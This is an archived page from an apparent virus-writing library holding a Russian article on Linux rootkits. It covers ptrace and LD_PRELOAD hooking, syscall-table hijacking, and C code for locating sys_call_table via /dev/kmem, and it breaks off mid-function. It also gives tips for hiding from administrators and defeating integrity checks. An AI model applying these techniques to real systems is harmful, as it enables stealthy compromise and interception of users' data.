<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Дмитрий Пукаленко 'Современные rootkit-технологии в Linux' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Дмитрий Пукаленко"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Пукаленко, Дмитрий,Современные rootkit-технологии в Linux, руткиты, mode, long, ptrace, памяти, unsigned, kernel, вызовов, системных, можно, preload, системного, regs, этот, вызова"/>
<meta name="Description" content="В этой статье рассмотрены основные технологии, применяемые в современных ring3 и ring0 руткитах для Linux. Некоторые методы остались за пределами статьи: например, патчинг VFS и смена обработчика прерываний - о них будет рассказано в следующей статье."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"83c32d42452a1d4816ae24b07a9bcff279509711-1498757822-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vdp00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Современные rootkit-технологии в Linux</h1><p><a href="/lib/?lang=ru&amp;author=%D0%9F%D1%83%D0%BA%D0%B0%D0%BB%D0%B5%D0%BD%D0%BA%D0%BE%2C%20%D0%94%D0%BC%D0%B8%D1%82%D1%80%D0%B8%D0%B9">Дмитрий Пукаленко</a><br/> <em>No Bunkum #1</em><br/> <em>Ноябрь 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vdp00.html';</script><img src="/img/pdf.gif" alt="PDF"/><a href="/lib/pdf/%D0%A1%D0%BE%D0%B2%D1%80%D0%B5%D0%BC%D0%B5%D0%BD%D0%BD%D1%8B%D0%B5%20rootkit-%D1%82%D0%B5%D1%85%D0%BD%D0%BE%D0%BB%D0%BE%D0%B3%D0%B8%D0%B8%20%D0%B2%20Linux.pdf">Скачать</a> PDF (478.21Kb) (Вы должны быть зарегистрированы на <a href="/forum">форуме</a>)<br/>[<a style="" href="/lib/?lang=RU&amp;index=RK#vdp00">Вернуться к списку</a>] [<a href="/lib/vdp00.html#disqus_thread">Комментарии</a>]<br/> 
<address>
Дмитрий Пукаленко<br/>
<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef978b86828e81af88828e8683c18c8082">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
</address>
<ul>
<li><a href="#c1">Вступление</a></li>
<li><a href="#c2">User-mode руткиты</a></li>
<li><a href="#c3">User-mode руткит: перехват действий с помощью ptrace()</a></li>
<li><a href="#c4">User-mode руткит: LD_PRELOAD</a></li>
<li><a href="#c5">Kernel-mode руткиты</a></li>
<li><a href="#c6">Kernel-mode руткит: подмена системных вызовов</a></li>
<li><a href="#c7">Kernel-mode руткит: обходимся без LKM</a></li>
<li><a href="#c8">Резюме</a></li>
<li><a href="#c9">Список литературы</a></li>
</ul>
<h2><a name="c1"></a>Вступление</h2>
<p>Механизмы функционирования руткитов для Linux - интересная и мало освещенная тема. Rootkit-технологии используются для таких задач, как сокрытие действий атакующего, подмена выдачи браузера, прозрачное проксирование, балансировка нагрузки, защита системы от атак.</p>
<p>Традиционно руткиты подразделяются на два больших класса: руткиты, работающие в пространстве пользователя (user-mode) и руткиты уровня ядра (kernel-mode). В данной статье я рассматриваю основные методы и нюансы реализации руткитов обоих типов.</p>
<h2><a name="c2"></a>User-mode руткиты</h2>
<p>Руткиты, работающие непосредственно в пространстве пользователя, стары как мир. Большинство из них функционируют за счет модификации утилит администрирования (ls, cat, ps, top, netstat и др.), обеспечивающей фильтрацию их вывода и сокрытие заданных файлов, настроек, сетевых подключений и другой системной информации. Ярким примером такого руткита является shv.</p>
<p>Подход, основанный на модификации исполняемых файлов, несет в себе массу недостатков. Во-первых, он не универсален: для обнаружения скрытых объектов достаточно воспользоваться утилитой, не входящей в стандартный набор администратора - например, просмотреть содержимое каталога в Midnight Commander. Во-вторых, все современные IDS (например, Tripwire) периодически сверяют целостность бинарных файлов по размеру и контрольной сумме. Как следствие описанных недостатков, данный подход неприменим в современных системах. Рассмотрим его альтернативы.</p>
<h2><a name="c3"></a>User-mode руткит: перехват вызовов с помощью ptrace()</h2>
<p>Система Linux предоставляет программисту широкие возможности для отладки приложений с помощью системного вызова ptrace(). Этот syscall позволяет получить практически полный контроль над сторонним процессом. Он имеет следующий прототип:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">long</span> ptrace<span style="color: black;">&#40;</span><span style="color: #000000; font-weight: bold;">enum</span> __ptrace_request request<span style="color: #339933;">,</span> pid_t pid<span style="color: #339933;">,</span> <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>addr<span style="color: #339933;">,</span> <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>data<span style="color: black;">&#41;</span><span style="color: #339933;">;</span></div>
<p>Первый параметр - команда отладчика, и назначение параметров addr и data меняется в зависимости от него. Для реализации руткита используются команды PTRACE_ATTACH, PTRACE_DETACH, PTRACE_GETREGS, PTRACE_SYSCALL, PTRACE_SETREGS, PTRACE_PEEKDATA, PTRACE_POKEDATA.</p>
<p>Рассмотрим вкратце логику работы руткита, основанного не перехвате ptrace().</p>
<ol>
<li>Осуществляется перебор процессов, запущенных на данный момент в системе, и присоединение к ним, кроме проме процессов 0 и 1, руткита при помощи PTRACE_ATTACH. В дальнейшем можно присоединяться к новым процессам, отслеживая системный вызов fork(). Отлаживаемые процессы автоматически становятся потомками руткита.</li>
<li>Получение идентификатора какого-либо из потомков руткита, получившего сигнал отладчика SIGTRAP, посредством вызова waitpid(-1, &amp;status, WUNTRACED).</li>
<li>3. Анализ системного вызова.
<p>В момент отладочного брейка процесс находится непосредственно перед выполнением системного вызова. При этом номер системного вызова находится в регистре eax - regs.orig_eax, а в regs.ebx, regs.ecx, regs.edx, regs.edi, regs.esi находятся остальные параметры. Для получения значений регистров вызываем ptrace с параметром PTRACE_GETREGS. При этом в параметр data загружается адрес структуры user_regs_struct, хранящейся в &lt;sys/user.h&gt;.</p>
<p>Как фильтровать системные вызовы? Для сокрытия процессов и файлов необходимо обрабатывать те вызовы, в которых значение regs.orig_eax соответствует константе __NR_getdents (__NR_getdents64). Для подмены содержимого файлов - __NR_read, __NR_write, и т.д. Полный список системных вызовов доступен в &lt;asm/unistd.h&gt;. Контроль всех сетевых вызовов на 32-битной архитектуре обеспечивается перехватом единственного системного вызова __NR_socketcall, при этом номер конкретной функции находится в regs.ebx (полный список номеров функций находится в &lt;linux/net.h&gt;). На 64-битных архитектурах за каждую сетевую процедуру отвечает отдельный системный вызов.</p>
<p>Если перехваченный вызов нам интересен, можно приступить к анализу аргументов. Вызываем ptrace с параметром PTRACE_PEEKDATA. При этом в параметре addr должен находиться реальный адрес в пространстве отлаживаемого процесса. Функция вернет 32-битное число (на 32-битных архитектурах), поэтому для получения полного содержимого анализируемого параметра нужно повторять в цикле процедуру вызова функции ptrace(..PTRACE_PEEKDATA..), постепенно увеличивая addr, необходимое число раз или до достижения нулевого байта, если речь идет о строке. После анализа и совершения необходимых приготовлений (например, сохранения адресов параметров и т.п.), можно переходить к следующему пункту.</p></li>
<li>Завершаем системный вызов: ptrace(..PTRACE_SYSCALL..), и ожидаем его результат: waitpid(pid, &amp;status, WUNTRACED). После чего снова вызываем ptrace(..PTRACE_GETREGS..) для получения контекста отлаживаемого процесса. В regs.eax будет получен результат системного вызова, который можно изменять - например, вернуть измененное количество прочитанных байт (для функции read()). Запись значений регистров обратно в пользовательский контекст выполняется с помощью PTRACE_SETREGS, с указанием в параметре data адреса структуры с измененными регистрами.
<p>Далее - анализ и изменение параметров. Модификация памяти процесса выполняется с помощью PTRACE_POKEDATA, при этом в качестве параметра addr указывается адрес в пространстве процесса, в качестве параметра data - значение (обратите внимание: значение, а не адрес!) для записи по данному адресу. Постепенно инкрементируя addr, запишем необходимые данные в пространство процесса.</p></li>
<li>Выполняем инструкцию PTRACE_SYSCALL и возвращаем процессу управление, после чего ожидаем очередного сигнала от процесса-потомка при помощи waitpid(-1, &amp;status, WUNTRACED).</li>
</ol>
<p>Это базовый алгоритм ptrace-руткита, не учитывающий нюансов реализации. Рассмотрим основные проблемы и подводные камни, возникающие в процессе разработки.</p>
<p>Выделение памяти в адресном пространстве чужих процессов. Для этого можно применить грязный хак, заключающийся в следующем. На этапе инициализации процесс часто совершает системный вызов mmap2() для постраничного выделения памяти и munmap - для освобождения. Перехватив mmap2, можно модифицировать параметр, хранящийся в regs.edx: добавить туда PROT_WRITE|PROT_EXEC, и при необходимости увеличить размер запрашиваемой памяти. Когда же процесс вызовет munmap - можно модифицировать второй параметр вызова, выставив его равным 0, или даже подменить регистры так, чтобы была вызвана функция brk(), что приведет к выделению дополнительной памяти. Теперь у нас есть блок памяти в адресном пространстве процесса, который можно использовать для своих нужд.</p>
<p>Выполнение произвольного кода в контексте процесса. Для этого можно скопировать необходимый код в память процесса, полученную вышеописанным методом, сохранить контекст текущего процесса (при помощи PTRACE_PEEKUSER и PTRACE_POKEUSER, см. &lt;sys/user.h&gt;), изменить eip и исполнить записанный код пошагово, с помощью параметра PTRACE_SINGLESTEP, после чего восстановить сохраненный контекст.</p>
<p>Есть еще один интересный момент, связанный с сокрытием объектов в системе. Если администратор системы, в которой установлен руткит, попытается отладить какую-либо программу с помощью gdb или просто протрассировать ее при помощи strace, он получит -EPERM (Operation not permitted), что выдаст присутствие руткита. Для предотвращения такой возможности можно перехватывать сам системный вызов ptrace, делать PTRACE_DETACH, и помещать pid отлаживаемого процесса и pid отладчика в очередь до тех пор, пока отладчик повторно не вызовет ptrace с параметром PTRACE_DETACH. После чего можно снова присоединяться к процессу и продолжать контролировать его выполнение.</p>
<h2><a name="c4"></a>User-mode руткит: LD_PRELOAD</h2>
<p>Переменная окружения LD_PRELOAD позволяет подгрузить свою библиотеку и подменить адреса библиотечных процедур, используемых в программе. Данную особенность системы также можно использовать с целью сокрытия тех или иных объектов. Недостаток этого метода в том, что перехватываются библиотечные функции, используемые программой, поэтому он узко специфичен. Но есть плюсы - например, перехватив SSL_read и SSL_write, можно читать и модифицировать незашифрованный трафик в обход SSL-шифрования!</p>
<p>Для использования данного метода переопределим в нашей .so библиотеке те функции, которые необходимо перехватывать, и обеспечим вызов оригинальной функции посредством ее динамической подгрузки из настоящей библиотеки с помощью dlopen/dlsym. Скомпилировав библиотеку, пропишем ее отдельной строкой в /etc/ld.so.preload, в результате чего все запускаемые впоследствии процессы будут работать с переопределенной функцией.</p>
<p>Что делать, если программа получает адреса функций динамически? В таком случае можно перехватывать вызовы dlopen и dlsym, и при совпадении параметров dlsym с перехватываемой функцией указывать адрес подставной процедуры.</p>
<p>Поскольку практически все программы используют функцию readdir для чтения элементов директории, ничто не мешает скрывать файлы и процессы, равно как и сам файл /etc/ld.so.preload.</p>
<h2><a name="c5"></a>Kernel-mode руткиты</h2>
<p>User-mode руткиты обладают существенным недостатком: их очень легко обнаружить из режима ядра. При этом работа руткита в режиме ядра, напротив, предоставляет неограниченные возможности для манипуляции системой и оборудованием.</p>
<p>Самый распространенный метод, обеспечивающий функционирование руткита уровня ядра - это перехват системных вызовов путем подмены соответствующей записи в таблице системных вызовов sys_call_table. Детали этого метода заключаются в следующем. При обработке прерывания int 0x80 (или инструкции sysenter) управление передается обработчику системных вызовов, который после предварительных процедур передает управление на адрес, записанный по смещению %eax в sys_call_table. Таким образом, подменив адрес в таблице, мы получаем контроль над системным вызовом. Этот метод имеет свои недостатки: в частности, он легко детектируется антируткитами; таблица вызовов в современных ядрах не экспортируется; и кроме того, перехват некоторых системных вызовов (например, execve()) нетривиален.</p>
<p>Другим распространенным механизмом в kernel-mode руткитах является патчинг VFS (Virtual Filesystem Switch). Этот подход применяется в рутките adore-ng. Он основан на подмене адреса какой-либо из функций-обработчиков для текущей файловой системы.</p>
<p>Как и в Windows, широко используется сплайсинг - замена первых байтов кода системного вызова на инструкцию jmp, осуществляющую переход на адрес обработчика руткита. В коде перехвата обеспечивается выполнение проверок, возврат байтов, вызов оригинального кода системного вызова и повторная установка перехвата. Данный метод также легко детектируется.</p>
<p>Еще один метод - подмена самого обработчика прерываний в IDT.</p>
<p>Рассмотрим некоторые методы реализации kernel-mode руткита более подробно.</p>
<h2><a name="c6"></a>Kernel-mode руткит: подмена системных вызовов</h2>
<p>Краеугольный камень этого метода - поиск адреса таблицы системных вызовов sys_call_table. Как уже упоминалось выше, в ядрах версии 2.6 таблица не экспортируется.</p>
<p>Первый способ решения этой проблемы - поиск таблицы в /proc/kallsyms.</p>
<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;"># cat /proc/kallsyms | grep sys_call_table</span><br/>
c03596e0 R sys_call_table<br/>
&nbsp;</div>
<p>Если администратор системы отключил kallsyms, то этот метод не сработает.</p>
<p>Существует также метод, основанный на поиске известного нам адреса sys_close там, где, предположительно, может находиться таблица. [1]</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span>ptr<span style="color: #339933;">;</span><br/>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> arr<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
ptr<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>init_mm.<span style="color: #202020;">end_code</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xfffffffc</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #b1b100;">while</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span>ptr <span style="color: #339933;">&lt;</span> <span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span>init_mm.<span style="color: #202020;">end_data</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>ptr <span style="color: #339933;">==</span> <span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span>sys_close<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;arr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">=*</span><span style="color: black;">&#40;</span>ptr<span style="color: #339933;">+</span>i<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;arr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span><span style="color: #339933;">=</span><span style="color: black;">&#40;</span>arr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span> <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">16</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x0000ffff</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>arr<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> arr<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span> <span style="color: #339933;">||</span> arr<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> arr<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sys_call_table<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>ptr <span style="color: #339933;">-</span> __NR_close<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp;<span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp;ptr<span style="color: #339933;">++</span> &nbsp; <span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
printk<span style="color: black;">&#40;</span>KERN_INFO<span style="color: #ff0000;">&quot;sys_call_table base found at: %x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>sys_call_table<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>Этот метод не дает стопроцентной гарантии обнаружения таблицы системных вызовов.</p>
<p>Зная, что реализация обработчика системных вызовов не менялась уже давно, мы можем использовать следующий алгоритм:</p>
<ul>
<li>получить адрес IDT;</li>
<li>получить адрес обработчика прерывания 0x80;</li>
<li>начать искать с этого адреса инструкцию call: там и будет искомый адрес таблицы.</li>
</ul>
<p>Код должен получиться примерно таким: [2]</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">main <span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> sys_call_off<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> sct<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">char</span> sc_asm<span style="color: black;">&#91;</span>CALLOFF<span style="color: black;">&#93;</span><span style="color: #339933;">,*</span>p<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* well let's read IDTR */</span><br/>
&nbsp; &nbsp; asm <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;sidt %0&quot;</span> <span style="color: #339933;">:</span> <span style="color: #ff0000;">&quot;=m&quot;</span> <span style="color: black;">&#40;</span>idtr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;idtr base at 0x%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">int</span><span style="color: black;">&#41;</span>idtr.<span style="color: #202020;">base</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* now we will open kmem */</span><br/>
&nbsp; &nbsp; kmem <span style="color: #339933;">=</span> open <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;/dev/kmem&quot;</span><span style="color: #339933;">,</span>O_RDONLY<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>kmem<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* read-in IDT for 0x80 vector (syscall) */</span><br/>
&nbsp; &nbsp; readkmem <span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>idt<span style="color: #339933;">,</span>idtr.<span style="color: #202020;">base</span><span style="color: #339933;">+</span><span style="color: #0000dd;">8</span><span style="color: #339933;">*</span><span style="color: #208080;">0x80</span><span style="color: #339933;">,</span><span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>idt<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; sys_call_off <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>idt.<span style="color: #202020;">off2</span> <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">16</span><span style="color: black;">&#41;</span> <span style="color: #339933;">|</span> idt.<span style="color: #202020;">off1</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;idt80: flags=%X sel=%X off=%X<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span><span style="color: black;">&#41;</span>idt.<span style="color: #202020;">flags</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span><span style="color: black;">&#41;</span>idt.<span style="color: #202020;">sel</span><span style="color: #339933;">,</span>sys_call_off<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* we have syscall routine address now, <br/>
&nbsp; &nbsp; &nbsp; &nbsp;look for syscall tabledispatch (indirect call) */</span><br/>
&nbsp; &nbsp; readkmem <span style="color: black;">&#40;</span>sc_asm<span style="color: #339933;">,</span>sys_call_off<span style="color: #339933;">,</span>CALLOFF<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; p <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>memmem <span style="color: black;">&#40;</span>sc_asm<span style="color: #339933;">,</span>CALLOFF<span style="color: #339933;">,</span><span style="color: #ff0000;">&quot;<span style="color: #660099; font-weight: bold;">\xff</span><span style="color: #660099; font-weight: bold;">\x14</span><span style="color: #660099; font-weight: bold;">\x85</span>&quot;</span><span style="color: #339933;">,</span><span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; sct <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">+</span><span style="color: #0000dd;">3</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>p<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;sys_call_table at 0x%x, call dispatch at 0x%x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> sct<span style="color: #339933;">,</span> p<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; close<span style="color: black;">&#40;</span>kmem<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>Этот код ориентирован на работу с памятью ядра из адресного пространства пользователя, однако может быть легко модифицирован для работы в режиме ядра. На сегодняшний день он является самым универсальным и надежным методом поиска таблицы системных вызовов.</p>
<p>Еще одна проблема метода перехвата системных вызовов заключается в невозможности перехватить execve() для контроля над создаваемыми процессами. Для ее решения можно использовать грязный хак: поиск свободного слота в sys_call_table, запись туда старого адреса execve(), перехват, и последующие вызовы через int 0x80.</p>
<p>Антируткиты, основанные на контроле целостности таблицы, обходятся простым поиском в пространстве ядра сохраненной копии таблицы и последующим ее изменением.</p>
<h2><a name="c7"></a>Kernel-mode руткит: обходимся без LKM</h2>
<p>Возможность загрузки дополнительных модулей в ядро может быть отключена при его сборке. В таких случаях используется патчинг ядра "на лету", подробно описанный в статье Phrack #58, Linux on-the-fly kernel patching without LKM[3]. Рассмотрим здесь основные принципы этого метода.</p>
<p>Во-первых, производится поиск таблицы системных вызовов. После этого необходимо найти адрес kmalloc для выделения памяти в пространстве ядра. Лучше всего это сделать через kmalloc, но в крайнем случае можно воспользоваться ненадежным методом брутфорса, основанным на поиске самой часто вызываемой функции со вторым параметром GFP_KERNEL. Для примера приведен код из статьи[3], модифицированный для ядер 2.6.х:</p>
<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> get_kma<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> kmem<span style="color: #339933;">,</span> ulong pgoff<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
